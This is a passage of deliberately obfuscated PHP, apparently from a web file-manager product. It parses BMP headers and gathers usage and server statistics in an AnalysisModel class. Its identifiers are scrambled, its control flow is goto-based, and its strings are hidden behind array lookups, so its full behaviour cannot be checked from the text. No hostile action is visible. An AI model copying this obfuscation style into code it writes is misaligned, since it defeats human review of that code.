$eÂÜÔ÷í–ë ? 1 / $eÂÜÔ÷í–ë : 1; goto d∆πâãπÊé; AëÔÓÜÂéç: } return $dèéú¯˜Õä; goto aπ†∞ªÙﬁå; FŸø£Îáú: $B·≤à‡–Ü≈ = abs($eà‡ØûÇ¡≠); $fáÁ—üà…€ = $eà‡ØûÇ¡≠ > 0 ? $B·≤à‡–Ü≈ - 1 : 0; $béìø‚üﬁí = $eà‡ØûÇ¡≠ > 0 ? -1 : 1; goto EÚ—⁄‚Òäƒ; e·’æ˜Üﬂ∫: if ($b¨èÂá∂ó∂ == 0 || $eà‡ØûÇ¡≠ == 0 || $FˆèÈÇ¡– != 1 || ($eÂÜÔ÷í–ë & $D≈èÈªëìî) != 0 || ($eÂÜÔ÷í–ë & $AçÉÜÙ≤‰ï) != 0 || ($eÂÜÔ÷í–ë & $DÓßë–áß) != 0 || ($D≈èÈªëìî & $AçÉÜÙ≤‰ï) != 0 || ($D≈èÈªëìî & $DÓßë–áß) != 0 || ($AçÉÜÙ≤‰ï & $DÓßë–áß) != 0) { return !1; } if ($AÜ‹ãÎŒßè == 4 || $AÜ‹ãÎŒßè == 5) { $dä÷ÁœŒ´‹ = stream_get_contents($Fèé…£ÕÒÖ, $bÓüú¬ëèå); if ($dä÷ÁœŒ´‹ === !1) { return !1; } return imagecreatefromstring($dä÷ÁœŒ´‹); } $cÈ‚î≥îûæ = $b¨èÂá∂ó∂ * $e¥∞ ù˜™ + 31 >> 3 & ~3; goto FŸø£Îáú; c¥≈Øï‡©‚: $AÖÜ∏“ì≈Ñ =& $_SERVER[—Ω]; if ($c¿©ƒﬁÇ‰»[$AÖÜ∏“ì≈Ñ[385]] != 19778) { return !1; } $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, 4); goto añÌÎùá¿◊; añÌÎùá¿◊: if ($dä÷ÁœŒ´‹ === !1) { return !1; } list(, $dÚó…â≠Í¡) = unpack($AÖÜ∏“ì≈Ñ[1815], $dä÷ÁœŒ´‹); if ($dÚó…â≠Í¡ == 12) { goto AÑÒ≈ôÃÉ›; C¯ØÍ˘ê’˜: $DÓßë–áß = 255; goto f∫â§Î’«Ø; AÑÒ≈ôÃÉ›: $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, $dÚó…â≠Í¡ - 4); if ($dä÷ÁœŒ´‹ === !1) { return !1; } extract(unpack($AÖÜ∏“ì≈Ñ[1816] . $AÖÜ∏“ì≈Ñ[1817] . $AÖÜ∏“ì≈Ñ[1818] . $AÖÜ∏“ì≈Ñ[1819], $dä÷ÁœŒ´‹)); goto f‡ËÿÔô≈—; f‡ËÿÔô≈—: $DëµÀ¯®∏Ö = $f√èÑûäêå = $eÂÜÔ÷í–ë = $AÜ‹ãÎŒßè = 0; $D≈èÈªëìî = 16711680; $AçÉÜÙ≤‰ï = 65280; goto C¯ØÍ˘ê’˜; f∫â§Î’«Ø: } else { if (124 < $dÚó…â≠Í¡ || $dÚó…â≠Í¡ < 40) { return !1; } else { goto aïîå¨øÆñ; eŒåóçæä‰: if ($b¨èÂá∂ó∂ & 2147483648) { $b¨èÂá∂ó∂ = -(~$b¨èÂá∂ó∂ & 4294967295) - 1; } if ($eà‡ØûÇ¡≠ & 2147483648) { $eà‡ØûÇ¡≠ = -(~$eà‡ØûÇ¡≠ & 4294967295) - 1; } if ($d¢Æﬂæ›ƒ› & 2147483648) { $d¢Æﬂæ›ƒ› = -(~$d¢Æﬂæ›ƒ› & 4294967295) - 1; } goto fÁﬁÌŸˆÍÊ; aïîå¨øÆñ: $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, 36); if ($dä÷ÁœŒ´‹ === !1) { return !1; } extract(unpack($AÖÜ∏“ì≈Ñ[1820] . $AÖÜ∏“ì≈Ñ[1821] . $AÖÜ∏“ì≈Ñ[1818] . $AÖÜ∏“ì≈Ñ[1822] . $AÖÜ∏“ì≈Ñ[1823] . $AÖÜ∏“ì≈Ñ[1824] . $AÖÜ∏“ì≈Ñ[1825] . $AÖÜ∏“ì≈Ñ[1826] . $AÖÜ∏“ì≈Ñ[1827] . $AÖÜ∏“ì≈Ñ[1828], $dä÷ÁœŒ´‹)); goto eŒåóçæä‰; fÁﬁÌŸˆÍÊ: if ($fÔõ‹£ÒÜ√ & 2147483648) { $fÔõ‹£ÒÜ√ = -(~$fÔõ‹£ÒÜ√ & 4294967295) - 1; } if ($c¿©ƒﬁÇ‰»[$AÖÜ∏“ì≈Ñ[516]] != 0) { $D—Øı”éÑ = $e¥∞ ù˜™ == 1 || $e¥∞ ù˜™ == 4 || $e¥∞ ù˜™ == 8 ? ($DëµÀ¯®∏Ö ? $DëµÀ¯®∏Ö : pow(2, $e¥∞ ù˜™)) << 2 : 0; $Dí˜ßËºÆ = $bÓüú¬ëèå ? $bÓüú¬ëèå : ($b¨èÂá∂ó∂ * $e¥∞ ù˜™ + 31 >> 3 & ~3) * abs($eà‡ØûÇ¡≠); $f¨¥öóã¿Ò = $c¿©ƒﬁÇ‰»[$AÖÜ∏“ì≈Ñ[516]] - $Dí˜ßËºÆ - $D—Øı”éÑ - 14; if ($dÚó…â≠Í¡ < $f¨¥öóã¿Ò && 40 <= $dÚó…â≠Í¡ && $dÚó…â≠Í¡ <= 124) { $dÚó…â≠Í¡ = $f¨¥öóã¿Ò; } } if ($dÚó…â≠Í¡ - 40 > 0) { $dä÷ÁœŒ´‹ = fread($Fèé…£ÕÒÖ, $dÚó…â≠Í¡ - 40); if ($dä÷ÁœŒ´‹ === !1) { return !1; } extract(unpack($AÖÜ∏“ì≈Ñ[1829] . $AÖÜ∏“ì≈Ñ[1830] . $AÖÜ∏“ì≈Ñ[1831] . $AÖÜ∏“ì≈Ñ[1832], $dä÷ÁœŒ´‹ . str_repeat($AÖÜ∏“ì≈Ñ[1833], 120))); } else { $eÂÜÔ÷í–ë = $D≈èÈªëìî = $AçÉÜÙ≤‰ï = $DÓßë–áß = 0; } goto dÒï≠∫√–ê; dÒï≠∫√–ê: if (($e¥∞ ù˜™ == 16 || $e¥∞ ù˜™ == 24 || $e¥∞ ù˜™ == 32) && $AÜ‹ãÎŒßè == 0 && $D≈èÈªëìî == 0 && $AçÉÜÙ≤‰ï == 0 && $DÓßë–áß == 0) { switch ($e¥∞ ù˜™) { case 16: $D≈èÈªëìî = 31744; $AçÉÜÙ≤‰ï = 992; $DÓßë–áß = 31; break; case 24: case 32: $D≈èÈªëìî = 16711680; $AçÉÜÙ≤‰ï = 65280; $DÓßë–áß = 255; break; } } goto cÆ˘ÇÛ‰Ó¨; cÆ˘ÇÛ‰Ó¨: } } goto e·’æ˜Üﬂ∫; aπ†∞ªÙﬁå: } } goto b´≠åŸáù±; aÎÔê¶≠±ø: class AnalysisModel extends ModelBaseLight { public function init($A° ÃïœÕ™) { $DíÃÑ«†®å =& $_SERVER[—Ω]; $Bà¢Ü•≈öÕ = array($DíÃÑ«†®å[531] => array($DíÃÑ«†®å[29] => $DíÃÑ«†®å[2006], $DíÃÑ«†®å[258] => array($DíÃÑ«†®å[207], $DíÃÑ«†®å[710], $DíÃÑ«†®å[2007], $DíÃÑ«†®å[2008])), $DíÃÑ«†®å[2009] => array($DíÃÑ«†®å[29] => $DíÃÑ«†®å[2010], $DíÃÑ«†®å[258] => array($DíÃÑ«†®å[207], $DíÃÑ«†®å[708], $DíÃÑ«†®å[2011], $DíÃÑ«†®å[2012], $DíÃÑ«†®å[2013]))); if (!isset($Bà¢Ü•≈öÕ[$A° ÃïœÕ™])) { return !1; } $this->optionType = $Bà¢Ü•≈öÕ[$A° ÃïœÕ™][$DíÃÑ«†®å[29]]; $this->field = $Bà¢Ü•≈öÕ[$A° ÃïœÕ™][$DíÃÑ«†®å[258]]; return !0; } public function listData($e‹±ÙÛïá› = false, $bÜ‹Î˜ïΩ‡ = "\155\157\x64\x69\x66\x79\x54\x69\155\145", $dèúπÑû»ì = false) { return parent::listData($e‹±ÙÛïá›, $bÜ‹Î˜ïΩ‡, $dèúπÑû»ì); } public function trendList($F«ôå∂•ß¢) { goto Fµü‚º∆ªÛ; Fµü‚º∆ªÛ: $dÏ∫Ç¥¯Æã =& $_SERVER[—Ω]; $c¢ÀãœŒäö = $this->listData(); if ($c¢ÀãœŒäö) { $e”©òìÎÖÂ = end($c¢ÀãœŒäö); $Aü¶Ï‘ôÁ› = date($dÏ∫Ç¥¯Æã[2014], strtotime($dÏ∫Ç¥¯Æã[2015])); if ($e”©òìÎÖÂ[$dÏ∫Ç¥¯Æã[207]] == $Aü¶Ï‘ôÁ›) { return $c¢ÀãœŒäö; } $e≠°Ω¬Ï—… = strtotime($e”©òìÎÖÂ[$dÏ∫Ç¥¯Æã[207]]); } goto fÁâô˜†°¶; b—æÁë≠ßá: foreach ($B•ƒº÷ØÕÑ as $Aü¶Ï‘ôÁ›) { $this->{$eáÿ≈úÙ” }($Aü¶Ï‘ôÁ›); } return $this->listData(); goto aèú’íûäÑ; fÁâô˜†°¶: if (!isset($e≠°Ω¬Ï—…)) { $E´ÁÒ∞›„≥ = $F«ôå∂•ß¢ == $dÏ∫Ç¥¯Æã[531] ? $dÏ∫Ç¥¯Æã[473] : $dÏ∫Ç¥¯Æã[762]; $e≠°Ω¬Ï—… = Model($E´ÁÒ∞›„≥)->min($dÏ∫Ç¥¯Æã[184]); } $eáÿ≈úÙ”  = $dÏ∫Ç¥¯Æã[2016] . ucfirst($F«ôå∂•ß¢); $B•ƒº÷ØÕÑ = $this->dateList($e≠°Ω¬Ï—…); goto b—æÁë≠ßá; aèú’íûäÑ: } private function dateList($a ¢ãÌ éÕ) { $DÆìÜ§Üü≤ =& $_SERVER[—Ω]; $bÖúÙÜâÜã = $a ¢ãÌ éÕ; $A∂Ö–ù£Œ• = strtotime($DÆìÜ§Üü≤[2015]); $dƒç¿Ú¯ê» = array(); while ($bÖúÙÜâÜã <= $A∂Ö–ù£Œ•) { $dƒç¿Ú¯ê»[] = date($DÆìÜ§Üü≤[2014], $bÖúÙÜâÜã); $bÖúÙÜâÜã = strtotime($DÆìÜ§Üü≤[2017], $bÖúÙÜâÜã); } return $dƒç¿Ú¯ê»; } public function _recordUser($Bâÿπè…Ï´ = '') { goto déå¨ëﬂ§ä; aƒ∆ﬂº€Ç: $A·ﬂî∂Ç…Û = Model($dÈôëÛ–èÖ[473])->where($c•—œ–ë¡◊)->count($dÈôëÛ–èÖ[1417]); $c•—œ–ë¡◊[$dÈôëÛ–èÖ[29]] = $dÈôëÛ–èÖ[2020]; $BÀ•·“≥±Ë = Model($dÈôëÛ–èÖ[2021])->where($c•—œ–ë¡◊)->count($dÈôëÛ–èÖ[2022]); goto D¢ºŒï´î£; Eö∫Éü©¡: $c•—œ–ë¡◊ = array($dÈôëÛ–èÖ[184] => array($dÈôëÛ–èÖ[933], $EúìÁ€ºâù)); $fååƒàüÜã = Model($dÈôëÛ–èÖ[473])->where($c•—œ–ë¡◊)->count($dÈôëÛ–èÖ[1417]); $c•—œ–ë¡◊[$dÈôëÛ–èÖ[184]] = array($dÈôëÛ–èÖ[318], array($DÁ„Ï≈ø…å, $EúìÁ€ºâù)); goto aƒ∆ﬂº€Ç; déå¨ëﬂ§ä: $dÈôëÛ–èÖ =& $_SERVER[—Ω]; $DÁ„Ï≈ø…å = strtotime(date($dÈôëÛ–èÖ[2018], strtotime($Bâÿπè…Ï´))); $EúìÁ€ºâù = strtotime(date($dÈôëÛ–èÖ[2019], strtotime($Bâÿπè…Ï´))); goto Eö∫Éü©¡; D¢ºŒï´î£: $e™üì„™Üã = array($dÈôëÛ–èÖ[207] => $Bâÿπè…Ï´, $dÈôëÛ–èÖ[710] => (int) $fååƒàüÜã, $dÈôëÛ–èÖ[2007] => (int) $A·ﬂî∂Ç…Û, $dÈôëÛ–èÖ[2008] => (int) $BÀ•·“≥±Ë); return $this->insert($e™üì„™Üã); goto D–¯“ëê€∏; D–¯“ëê€∏: } public function _recordStore($C¬ÃÉÑ¿‹ö = '') { goto dÀ™æÓå’¢; aê¥Ò⁄¢œ¥: $eÇÛÙˆ∂π‰[$Dßì±œÏ∫Õ[368]] = 1; $bŒΩ§Ø±ô‘ = Model($Dßì±œÏ∫Õ[762])->where($eÇÛÙˆ∂π‰)->sum($Dßì±œÏ∫Õ[77]); $eÇÛÙˆ∂π‰[$Dßì±œÏ∫Õ[368]] = 2; goto B‚’ﬁâ≠’Ú; B‚’ﬁâ≠’Ú: $F∫∑Û´¡£Ï = Model($Dßì±œÏ∫Õ[762])->where($eÇÛÙˆ∂π‰)->sum($Dßì±œÏ∫Õ[77]); $Fî‡ÒÁˆé· = array($Dßì±œÏ∫Õ[207] => $C¬ÃÉÑ¿‹ö, $Dßì±œÏ∫Õ[708] => (int) $E˘πø∆éÈŸ, $Dßì±œÏ∫Õ[2011] => (int) $F‹óôè‚º∫, $Dßì±œÏ∫Õ[2012] => (int) $bŒΩ§Ø±ô‘, $Dßì±œÏ∫Õ[2013] => (int) $F∫∑Û´¡£Ï); return $this->insert($Fî‡ÒÁˆé·); goto CÎûçƒ√ÊØ; B´∑’ﬂÂﬁ•: $F‹óôè‚º∫ = Model($Dßì±œÏ∫Õ[418])->where($eÇÛÙˆ∂π‰)->sum($Dßì±œÏ∫Õ[77]); $eÇÛÙˆ∂π‰[$Dßì±œÏ∫Õ[367]] = 0; $E˘πø∆éÈŸ = Model($Dßì±œÏ∫Õ[762])->where($eÇÛÙˆ∂π‰)->sum($Dßì±œÏ∫Õ[77]); goto aê¥Ò⁄¢œ¥; dÀ™æÓå’¢: $Dßì±œÏ∫Õ =& $_SERVER[—Ω]; $C¬ìÆ¿πÉ¨ = strtotime(date($Dßì±œÏ∫Õ[2019], strtotime($C¬ÃÉÑ¿‹ö))); $eÇÛÙˆ∂π‰ = array($Dßì±œÏ∫Õ[184] => array($Dßì±œÏ∫Õ[933], $C¬ìÆ¿πÉ¨)); goto B´∑’ﬂÂﬁ•; CÎûçƒ√ÊØ: } public function trend($DÒ•ÜÒúØ˜, $aöå≥ñ’ä∂) { goto D¥ÇçÍµÃ≠; D¥ÇçÍµÃ≠: $càÆ…ãÍ≤í =& $_SERVER[—Ω]; if (!$this->init($DÒ•ÜÒúØ˜)) { return !1; } $fÖûáé£àƒ = $this->trendList($DÒ•ÜÒúØ˜); goto dª‡©ÎÿÌÒ; B¢”å‹“∞: if (empty($fÖûáé£àƒ)) { $eÖäﬁ´ûöÉ = date($càÆ…ãÍ≤í[2014], strtotime($càÆ…ãÍ≤í[2015])); $EŸè„»Ô∏’ = array($càÆ…ãÍ≤í[207] => $eÖäﬁ´ûöÉ); foreach ($D’º¬πµ≤›[$DÒ•ÜÒúØ˜] as $AÌ≠‚©Ùùä => $Bè÷ú¢øÆ∏) { $EŸè„»Ô∏’[$AÌ≠‚©Ùùä] = 0; } $fÖûáé£àƒ[] = $EŸè„»Ô∏’; } $Dõ⁄±ÆÁãç = array(); foreach ($fÖûáé£àƒ as $Bè÷ú¢øÆ∏) { if ($DÒ•ÜÒúØ˜ == $càÆ…ãÍ≤í[2009] && $Bè÷ú¢øÆ∏[$càÆ…ãÍ≤í[2011]] > $Bè÷ú¢øÆ∏[$càÆ…ãÍ≤í[708]]) { $Bè÷ú¢øÆ∏[$càÆ…ãÍ≤í[2011]] = $Bè÷ú¢øÆ∏[$càÆ…ãÍ≤í[708]]; } foreach ($D’º¬πµ≤›[$DÒ•ÜÒúØ˜] as $AÌ≠‚©Ùùä => $E‹ÙÔÊ«Æ£) { $a¯≈Ôëçı± = array($càÆ…ãÍ≤í[207] => $Bè÷ú¢øÆ∏[$càÆ…ãÍ≤í[207]], $càÆ…ãÍ≤í[1325] => $E‹ÙÔÊ«Æ£); $a¯≈Ôëçı±[$dâ‚øü∑ÈÉ[$DÒ•ÜÒúØ˜]] = isset($Bè÷ú¢øÆ∏[$AÌ≠‚©Ùùä]) ? $Bè÷ú¢øÆ∏[$AÌ≠‚©Ùùä] : 0; $Dõ⁄±ÆÁãç[] = $a¯≈Ôëçı±; } } goto bÜäﬁÙë∫´; bÜäﬁÙë∫´: return $Dõ⁄±ÆÁãç; goto böıÆ¨Á‹©; dª‡©ÎÿÌÒ: if ($fÖûáé£àƒ && $aöå≥ñ’ä∂ != $càÆ…ãÍ≤í[1392]) { $f·¥⁄ö©º = $fÖûáé£àƒ[0][$càÆ…ãÍ≤í[207]]; $AÀ«Âµ¿ıÖ = $this->validDate($aöå≥ñ’ä∂, $f·¥⁄ö©º); $c≤≥¢ŒŒ”Í = array(); $eØÉ◊‡”≤≥ = array_to_keyvalue($fÖûáé£àƒ, $càÆ…ãÍ≤í[207]); foreach ($AÀ«Âµ¿ıÖ as $eÖäﬁ´ûöÉ) { if (isset($eØÉ◊‡”≤≥[$eÖäﬁ´ûöÉ])) { $a¯≈Ôëçı± = $eØÉ◊‡”≤≥[$eÖäﬁ´ûöÉ]; } else { $a¯≈Ôëçı± = end($fÖûáé£àƒ); $a¯≈Ôëçı±[$càÆ…ãÍ≤í[207]] = $eÖäﬁ´ûöÉ; if ($DÒ•ÜÒúØ˜ == $càÆ…ãÍ≤í[531]) { $a¯≈Ôëçı±[$càÆ…ãÍ≤í[2007]] = $a¯≈Ôëçı±[$càÆ…ãÍ≤í[2008]] = 0; } } $c≤≥¢ŒŒ”Í[] = $a¯≈Ôëçı±; } $fÖûáé£àƒ = $c≤≥¢ŒŒ”Í; } $D’º¬πµ≤› = array($càÆ…ãÍ≤í[531] => array($càÆ…ãÍ≤í[710] => LNG($càÆ…ãÍ≤í[2023]), $càÆ…ãÍ≤í[2007] => LNG($càÆ…ãÍ≤í[2024]), $càÆ…ãÍ≤í[2008] => LNG($càÆ…ãÍ≤í[2025])), $càÆ…ãÍ≤í[2009] => array($càÆ…ãÍ≤í[708] => LNG($càÆ…ãÍ≤í[2026]), $càÆ…ãÍ≤í[2011] => LNG($càÆ…ãÍ≤í[2027]), $càÆ…ãÍ≤í[2012] => LNG($càÆ…ãÍ≤í[2028]), $càÆ…ãÍ≤í[2013] => LNG($càÆ…ãÍ≤í[2029]))); $dâ‚øü∑ÈÉ = array($càÆ…ãÍ≤í[531] => $càÆ…ãÍ≤í[2030], $càÆ…ãÍ≤í[2009] => $càÆ…ãÍ≤í[77]); goto B¢”å‹“∞; böıÆ¨Á‹©: } public function validDate($FéôáÀ‹˜õ, $bﬂ∞Ê«ÙÎÚ) { goto d∑¶úØ±°≈; DêÿÚıﬁ÷¥: return $f«ŒﬁªçÔ•; goto C¿Æ‡ôá£ç; fàÑÑô◊†ÿ: switch ($FéôáÀ‹˜õ) { case $EŒá®∞ö¡º[1399]: $DÃìÀ”È‡Ç = mktime(0, 0, 0, date($EŒá®∞ö¡º[2031]), date($EŒá®∞ö¡º[2032]) - date($EŒá®∞ö¡º[1222]) + 7 - 7, date($EŒá®∞ö¡º[2033])); $fﬁ£≤í—Ó = 0; do { $B⁄ç≥…ˆÎÀ = date($EŒá®∞ö¡º[2014], $DÃìÀ”È‡Ç - 3600 * 24 * 7 * $fﬁ£≤í—Ó); $f«ŒﬁªçÔ•[] = $B⁄ç≥…ˆÎÀ; $fﬁ£≤í—Ó++; } while ($bﬂ∞Ê«ÙÎÚ < $B⁄ç≥…ˆÎÀ); break; case $EŒá®∞ö¡º[1397]: $fﬁ£≤í—Ó = 1; do { $Cƒã¨†Î¯œ = date($EŒá®∞ö¡º[2034], strtotime("\55\x20{$fﬁ£≤í—Ó}\x20\x6d\157\x6e\164\150\163")); $f«ŒﬁªçÔ•[] = $Cƒã¨†Î¯œ; $fﬁ£≤í—Ó++; } while ($bﬂ∞Ê«ÙÎÚ < $Cƒã¨†Î¯œ); break; case $EŒá®∞ö¡º[1702]: $bí∏´öÎéÇ = (int) date($EŒá®∞ö¡º[2033], strtotime($bﬂ∞Ê«ÙÎÚ)); $aôÊÊù≤≈Ö = (int) date($EŒá®∞ö¡º[2033]); if ($bí∏´öÎéÇ >= $aôÊÊù≤≈Ö) { break; } for ($bí∏´öÎéÇ; $bí∏´öÎéÇ < $aôÊÊù≤≈Ö; $bí∏´öÎéÇ++) { $f«ŒﬁªçÔ•[] = $bí∏´öÎéÇ . $EŒá®∞ö¡º[2035]; } break; default: break; } if ($bﬂ∞Ê«ÙÎÚ > end($f«ŒﬁªçÔ•)) { array_pop($f«ŒﬁªçÔ•); } sort($f«ŒﬁªçÔ•); goto DêÿÚıﬁ÷¥; d∑¶úØ±°≈: $EŒá®∞ö¡º =& $_SERVER[—Ω]; $c‰à≈ÏÚ†Ü = date($EŒá®∞ö¡º[2014], strtotime($EŒá®∞ö¡º[2015])); $f«ŒﬁªçÔ• = array($c‰à≈ÏÚ†Ü); goto fàÑÑô◊†ÿ; C¿Æ‡ôá£ç: } public function listTable($BŒﬁ∆ﬁµ´∆) { $dòáùáãçŒ = ucfirst($BŒﬁ∆ﬁµ´∆); return Model($dòáùáãçŒ)->listData(); } public function option($EÏùõÑãÆÎ) { $Dª„‡ñ”Ò¬ = $_SERVER[—Ω][2036] . ucfirst($EÏùõÑãÆÎ); return $this->{$Dª„‡ñ”Ò¬}(); } private function optionUser() { goto fà›–‹µ®‡; eèøÒ†çü”: $F´êŸƒèÛÿ = strtotime($CÁáøî‡Ÿ≠[2038]); $c∏È∆Öúüè = array($CÁáøî‡Ÿ≠[2039] => array($CÁáøî‡Ÿ≠[934], $F´êŸƒèÛÿ)); $BÏ¬åèÔßÍ = (int) Model($CÁáøî‡Ÿ≠[473])->where($c∏È∆Öúüè)->count($CÁáøî‡Ÿ≠[1417]); goto A’ï¢ïçÀ´; fà›–‹µ®‡: $CÁáøî‡Ÿ≠ =& $_SERVER[—Ω]; $Eùè·∂Ω…Â = Model($CÁáøî‡Ÿ≠[473])->count($CÁáøî‡Ÿ≠[1417]); $eé◊•ä∫¿é = Model($CÁáøî‡Ÿ≠[473])->where($CÁáøî‡Ÿ≠[2037])->count($CÁáøî‡Ÿ≠[1417]); goto eèøÒ†çü”; A’ï¢ïçÀ´: if (!$BÏ¬åèÔßÍ) { $BÏ¬åèÔßÍ = 1; } $F´êŸƒèÛÿ = strtotime(date($CÁáøî‡Ÿ≠[2018])); $c∏È∆Öúüè = array($CÁáøî‡Ÿ≠[2039] => array($CÁáøî‡Ÿ≠[934], $F´êŸƒèÛÿ)); goto Dõó•—Ú∆ﬁ; Dõó•—Ú∆ﬁ: $F®Üœ»ìáà = Model($CÁáøî‡Ÿ≠[473])->where($c∏È∆Öúüè)->count($CÁáøî‡Ÿ≠[1417]); return array($CÁáøî‡Ÿ≠[705] => (int) $Eùè·∂Ω…Â, $CÁáøî‡Ÿ≠[2040] => (int) ($Eùè·∂Ω…Â - $eé◊•ä∫¿é), $CÁáøî‡Ÿ≠[2041] => (int) $eé◊•ä∫¿é, $CÁáøî‡Ÿ≠[2042] => (int) $F®Üœ»ìáà, $CÁáøî‡Ÿ≠[2043] => $BÏ¬åèÔßÍ); goto fè‹„÷◊ºô; fè‹„÷◊ºô: } private function optionFile() { goto AªÔÑ≈Íæπ; Dﬂí‚ëõªÔ: $a’√¬Ü¢™ñ = Model($fèØ•œÛﬁﬂ[762])->where($bëÕËÈ’ÿô)->sum($fèØ•œÛﬁﬂ[77]); $e¯•®àÃã = Model($fèØ•œÛﬁﬂ[762])->where($bëÕËÈ’ÿô)->count($fèØ•œÛﬁﬂ[366]); return array($fèØ•œÛﬁﬂ[708] => $eŸã©Ï’Ωì, $fèØ•œÛﬁﬂ[2011] => $BÀÎì¥·›ﬂ, $fèØ•œÛﬁﬂ[2044] => $eŸã©Ï’Ωì - $BÀÎì¥·›ﬂ, $fèØ•œÛﬁﬂ[2045] => (int) $a’√¬Ü¢™ñ, $fèØ•œÛﬁﬂ[710] => (int) $cô¯·‘•◊˘, $fèØ•œÛﬁﬂ[2046] => (int) $e¯•®àÃã); goto cìÆì∆ÈÑ´; AªÔÑ≈Íæπ: $fèØ•œÛﬁﬂ =& $_SERVER[—Ω]; $aÇﬁÁ  «∏ = $this->sourceSize(); $eŸã©Ï’Ωì = $aÇﬁÁ  «∏[$fèØ•œÛﬁﬂ[77]]; goto bØ¨ÉÈ∏≈æ; bØ¨ÉÈ∏≈æ: $BÀÎì¥·›ﬂ = $aÇﬁÁ  «∏[$fèØ•œÛﬁﬂ[2011]]; $cô¯·‘•◊˘ = Model($fèØ•œÛﬁﬂ[762])->where(array($fèØ•œÛﬁﬂ[367] => 0))->count($fèØ•œÛﬁﬂ[366]); $bëÕËÈ’ÿô = array($fèØ•œÛﬁﬂ[367] => 0, $fèØ•œÛﬁﬂ[184] => array($fèØ•œÛﬁﬂ[934], strtotime(date($fèØ•œÛﬁﬂ[2018])))); goto Dﬂí‚ëõªÔ; cìÆì∆ÈÑ´: } private function optionAccess() { $a◊–éŒ∆†§ =& $_SERVER[—Ω]; return array($a◊–éŒ∆†§[705] => $this->typeLogCnt(), $a◊–éŒ∆†§[91] => $this->typeLogCnt($a◊–éŒ∆†§[91]), $a◊–éŒ∆†§[400] => $this->typeLogCnt($a◊–éŒ∆†§[400]), $a◊–éŒ∆†§[2047] => $this->typeLogCnt($a◊–éŒ∆†§[2047]), $a◊–éŒ∆†§[2048] => $this->typeLogCnt($a◊–éŒ∆†§[2048]), $a◊–éŒ∆†§[531] => $this->typeLogCnt($a◊–éŒ∆†§[33], $a◊–éŒ∆†§[2022])); } private function typeLogCnt($a‹§’ÒÛ£Ã = '', $f›µº∞âõ† = "\151\x64") { goto c∫ôÙ¶úîˆ; c∫ôÙ¶úîˆ: $eΩè™ﬂÃèÑ =& $_SERVER[—Ω]; $fé·Ü“ƒÇì = array($eΩè™ﬂÃèÑ[91] => array($eΩè™ﬂÃèÑ[2049], $eΩè™ﬂÃèÑ[2050]), $eΩè™ﬂÃèÑ[400] => array($eΩè™ﬂÃèÑ[2051], $eΩè™ﬂÃèÑ[2052]), $eΩè™ﬂÃèÑ[2047] => array($eΩè™ﬂÃèÑ[2053], $eΩè™ﬂÃèÑ[2054]), $eΩè™ﬂÃèÑ[2048] => array($eΩè™ﬂÃèÑ[2055], $eΩè™ﬂÃèÑ[2056]), $eΩè™ﬂÃèÑ[2057] => array($eΩè™ﬂÃèÑ[2058], $eΩè™ﬂÃèÑ[2059], $eΩè™ﬂÃèÑ[2060])); $Dˆ∑œ÷∏∫§ = strtotime(date($eΩè™ﬂÃèÑ[2018])); goto dÿ¥·‚ûÀÜ; dÿ¥·‚ûÀÜ: $c√Êóü›µ≠ = array($eΩè™ﬂÃèÑ[184] => array($eΩè™ﬂÃèÑ[934], $Dˆ∑œ÷∏∫§)); if ($a‹§’ÒÛ£Ã) { $c√Êóü›µ≠[$eΩè™ﬂÃèÑ[29]] = array($eΩè™ﬂÃèÑ[7], $fé·Ü“ƒÇì[$a‹§’ÒÛ£Ã]); } $BÁ◊íìîõˆ = Model($eΩè™ﬂÃèÑ[2021])->where($c√Êóü›µ≠)->count($f›µº∞âõ†); goto F“÷≤‰´¡õ; F“÷≤‰´¡õ: return (int) $BÁ◊íìîõˆ; goto dÂõ∂ŒÚÎÆ; dÂõ∂ŒÚÎÆ: } private function optionServer() { goto Føç—â¶·é; Føç—â¶·é: $a‰áÃüıãÜ =& $_SERVER[—Ω]; $D∂†üé¯õΩ = $this->diskDriver(); $EÌ∂”ç·Â› = KodIO::defaultDriver(); goto DÂ‘âÚÇßá; F¬™ú÷«£≤: $B«ì¶Êê÷ = $bÖÒßí¨¯ì[0]; $AÚ„Ï›Òê∞ = $GLOBALS[$a‰áÃüıãÜ[6]][$a‰áÃüıãÜ[17]]; $c›¢Ø¬ã€¨ = $AÚ„Ï›Òê∞[$a‰áÃüıãÜ[894]]; goto FÔΩæﬁ⁄; fıÁ£óÉ”ˆ: return array($a‰áÃüıãÜ[2063] => $D∂†üé¯õΩ ? $D∂†üé¯õΩ[$a‰áÃüıãÜ[2064]] : 0, $a‰áÃüıãÜ[2065] => $D∂†üé¯õΩ ? $D∂†üé¯õΩ[$a‰áÃüıãÜ[2066]] : 0, $a‰áÃüıãÜ[2067] => (int) $EÌ∂”ç·Â›[$a‰áÃüıãÜ[2064]] * 1024 * 1024 * 1024, $a‰áÃüıãÜ[2068] => (int) $aìÚ√ÈﬁáÇ, $a‰áÃüıãÜ[2069] => ucfirst($B«ì¶Êê÷), $a‰áÃüıãÜ[2070] => $a‰áÃüıãÜ[2071] . PHP_VERSION, $a‰áÃüıãÜ[2072] => phpBuild64() ? 64 : 32, $a‰áÃüıãÜ[704] => str_replace($a‰áÃüıãÜ[2073], $a‰áÃüıãÜ[910], $c›¢Ø¬ã€¨), $a‰áÃüıãÜ[334] => ucfirst($E∏ûé’“πÉ), $a‰áÃüıãÜ[28] => $_SERVER[$a‰áÃüıãÜ[2074]]); goto DÒ∫Ë…ÃÈû; DÂ‘âÚÇßá: $DÁ˘éÉ©†Ç = array($a‰áÃüıãÜ[753] => $EÌ∂”ç·Â›[$a‰áÃüıãÜ[364]]); $aìÚ√ÈﬁáÇ = Model($a‰áÃüıãÜ[418])->where($DÁ˘éÉ©†Ç)->sum($a‰áÃüıãÜ[77]); $bÖÒßí¨¯ì = explode($a‰áÃüıãÜ[50], $_SERVER[$a‰áÃüıãÜ[138]]); goto F¬™ú÷«£≤; FÔΩæﬁ⁄: if ($c›¢Ø¬ã€¨ == $a‰áÃüıãÜ[734]) { $BÿéäÓÉ»… = explode($a‰áÃüıãÜ[1080], $AÚ„Ï›Òê∞[$a‰áÃüıãÜ[893]]); $c›¢Ø¬ã€¨ = $BÿéäÓÉ»…[0]; } if ($c›¢Ø¬ã€¨ == $a‰áÃüıãÜ[737] || $c›¢Ø¬ã€¨ == $a‰áÃüıãÜ[738]) { $eï∆¯Ω ™ú = Model()->db()->query($a‰áÃüıãÜ[2061]); 